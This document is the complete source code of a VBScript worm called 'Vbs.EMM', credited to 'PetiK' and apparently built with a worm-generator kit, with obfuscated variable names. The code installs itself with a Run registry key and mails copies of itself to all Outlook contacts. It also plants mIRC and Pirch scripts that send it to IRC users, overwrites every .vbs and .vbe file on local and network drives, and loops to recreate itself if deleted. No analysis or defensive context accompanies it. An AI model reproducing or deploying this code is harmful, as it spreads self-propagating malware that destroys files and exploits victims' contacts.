'Vbs.EMM Created By PetiK
On Error Resume Next
Set jrbvamjyzpz= Createobject("scripting.filesystemobject")
jrbvamjyzpz.copyfile wscript.scriptfullname,jrbvamjyzpz.GetSpecialFolder(1)& "\EMM.vbs"
Set cgbrvvuxjmq = CreateObject("WScript.Shell")
cgbrvvuxjmq.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM","wscript.exe "&jrbvamjyzpz.GetSpecialFolder(1)& "\EMM.vbs %"
if cgbrvvuxjmq.regread ("HKCU\software\EMM\mailed") <> "1" then
flltvwsemia()
end if
if cgbrvvuxjmq.regread ("HKCU\software\EMM\mirqued") <> "1" then
rtdrtazqxjj ""
end if
if cgbrvvuxjmq.regread ("HKCU\software\EMM\pirched") <> "1" then
xbiwgvhqdqw ""
end if
tcufxcfdjsz()
Set ddiurghxbko= jrbvamjyzpz.opentextfile(wscript.scriptfullname, 1)
jzwxwyruygt= ddiurghxbko.readall
ddiurghxbko.Close
Do
If Not (jrbvamjyzpz.fileexists(wscript.scriptfullname)) Then
Set tbwxtgukjau= jrbvamjyzpz.createtextfile(wscript.scriptfullname, True)
tbwxtgukjau.writejzwxwyruygt
tbwxtgukjau.Close
End If
Loop
Function flltvwsemia()
On Error Resume Next
Set ezvchyyssfk = CreateObject("Outlook.Application")
If ezvchyyssfk= "Outlook"Then
Set qeodpyeyxud=ezvchyyssfk.GetNameSpace("MAPI")
For Each cnfknlraalm In qeodpyeyxud.AddressLists
If cnfknlraalm.AddressEntries.Count <> 0 Then
ffehzwzocuc = cnfknlraalm.AddressEntries.Count
For qcthpgjswrh= 1 To ffehzwzocuc
Set egcodskicmi = ezvchyyssfk.CreateItem(0)
Set dkpggathsyf = cnfknlraalm.AddressEntries(qcthpgjswrh)
egcodskicmi.To = dkpggathsyf.Address
egcodskicmi.Subject = "Here you have, ;o)"
egcodskicmi.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
wfyanhfcmkv.Add jrbvamjyzpz.GetSpecialFolder(1)& "\EMM.vbs"
egcodskicmi.DeleteAfterSubmit = True
If egcodskicmi.To <> "" Then
egcodskicmi.Send
cgbrvvuxjmq.regwrite "HKCU\software\EMM\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function rtdrtazqxjj(gtwuzbituze)
On Error Resume Next
if gtwuzbituze = "" then
if jrbvamjyzpz.fileexists("c:\mirc\mirc.ini") then gtwuzbituze="c:\mirc"
if jrbvamjyzpz.fileexists("c:\mirc32\mirc.ini") then gtwuzbituze="c:\mirc32"
bqyhrbysinn=cgbrvvuxjmq.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if jrbvamjyzpz.fileexists(bqyhrbysinn & "\mirc\mirc.ini") then gtwuzbituze=bqyhrbysinn & "\mirc"
end if
if gtwuzbituze <> "" then
set mphehxddlno = jrbvamjyzpz.CreateTextFile(gtwuzbituze & "\script.ini", True)
mphehxddlno.WriteLine "[script]"
mphehxddlno.writeline "n0=on 1:JOIN:#:{"
mphehxddlno.writeline "n1=  /if ( $nick == $me ) { halt }"
mphehxddlno.writeline "n2=  /.dcc send $nick "&jrbvamjyzpz.GetSpecialFolder(1)& "\EMM.vbs"
mphehxddlno.writeline "n3=}"
mphehxddlno.close
cgbrvvuxjmq.regwrite "HKCU\software\EMM\Mirqued", "1"
end if
end function
function xbiwgvhqdqw(kweasjkvjls)
On Error Resume Next
if kweasjkvjls="" then
if jrbvamjyzpz.fileexists("c:\pirch\Pirch32.exe") then kweasjkvjls="c:\pirch"
if jrbvamjyzpz.fileexists("c:\pirch32\Pirch32.exe") then kweasjkvjls="c:\pirch32"
xioibpaznen=cgbrvvuxjmq.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if jrbvamjyzpz.fileexists(xioibpaznen & "\pirch\Pirch32.exe") then kweasjkvjls=xioibpaznen & "\pirch\Pirch32.exe"
end if
if kweasjkvjls <> "" then
set giviolusepb= jrbvamjyzpz.CreateTextFile(kweasjkvjls & "\events.ini", True)
giviolusepb.WriteLine "[Levels]"
giviolusepb.WriteLine "Enabled=1"
giviolusepb.WriteLine "Count=6"
giviolusepb.WriteLine "Level1=000-Unknowns"
giviolusepb.WriteLine "000-UnknownsEnabled=1"
giviolusepb.WriteLine "Level2=100-Level 100"
giviolusepb.WriteLine "100-Level 100Enabled=1"
giviolusepb.WriteLine "Level3=200-Level 200"
giviolusepb.WriteLine "200-Level 200Enabled=1"
giviolusepb.WriteLine "Level4=300-Level 300"
giviolusepb.WriteLine " 300-Level 300Enabled=1"
giviolusepb.WriteLine "Level5=400-Level 400 "
giviolusepb.WriteLine "400-Level 400Enabled=1"
giviolusepb.WriteLine "Level6=500-Level 500"
giviolusepb.WriteLine "500-Level 500Enabled=1"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[000-Unknowns]"
giviolusepb.WriteLine "UserCount=0"
giviolusepb.WriteLine "EventCount=0"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[100-Level 100]"
giviolusepb.WriteLine "User1=*!*@*"
giviolusepb.WriteLine "UserCount=1"
giviolusepb.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & jrbvamjyzpz.GetSpecialFolder(1) & "\EMM.vbs"
giviolusepb.WriteLine "EventCount=1"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[200-Level 200]"
giviolusepb.WriteLine "UserCount=0"
giviolusepb.WriteLine "EventCount=0"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[300-Level 300]"
giviolusepb.WriteLine "UserCount=0"
giviolusepb.WriteLine "EventCount=0"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[400-Level 400]"
giviolusepb.WriteLine "UserCount=0"
giviolusepb.WriteLine "EventCount=0"
giviolusepb.WriteLine ""
giviolusepb.WriteLine "[500-Level 500]"
giviolusepb.WriteLine "UserCount=0"
giviolusepb.WriteLine "EventCount=0"
giviolusepb.close
cgbrvvuxjmq.regwrite "HKCU\software\EMM\pirched", "1"
end if
end function
Function tcufxcfdjsz()
On Error Resume Next
Set xvbjrbvamjy = jrbvamjyzpz.Drives
For Each zpzcgbrvvux In xvbjrbvamjy
If zpzcgbrvvux.Drivetype = Remote Then
jmqflltvwse= zpzcgbrvvux & "\"
Call miartdrtazq(jmqflltvwse)
ElseIf zpzcgbrvvux.IsReady Then
jmqflltvwse= zpzcgbrvvux&"\"
Call miartdrtazq(jmqflltvwse)
End If
Next
End Function
Function miartdrtazq(xjjxbiwgvhq)
Set dqwtcufxcfd= jrbvamjyzpz.GetFolder(xjjxbiwgvhq)
Set jszddiurghx= dqwtcufxcfd.Files
For Each bkojzwxwyru In jszddiurghx
if jrbvamjyzpz.GetExtensionName(bkojzwxwyru.path) = "vbs" then
jrbvamjyzpz.copyfile wscript.scriptfullname , bkojzwxwyru.path , true
end if
if jrbvamjyzpz.GetExtensionName(bkojzwxwyru.path) = "vbe" then
jrbvamjyzpz.copyfile wscript.scriptfullname , bkojzwxwyru.path , true
end if
if bkojzwxwyru.name = "mirc.ini" then
rtdrtazqxjj(bkojzwxwyru.ParentFolder)
end if
Next
Set bkojzwxwyru= dqwtcufxcfd.SubFolders
For Each ygttbwxtguk In bkojzwxwyru
Call miartdrtazq(ygttbwxtguk.path)
Next
End Function
'Vbswg 1.0. [K]Alamar.
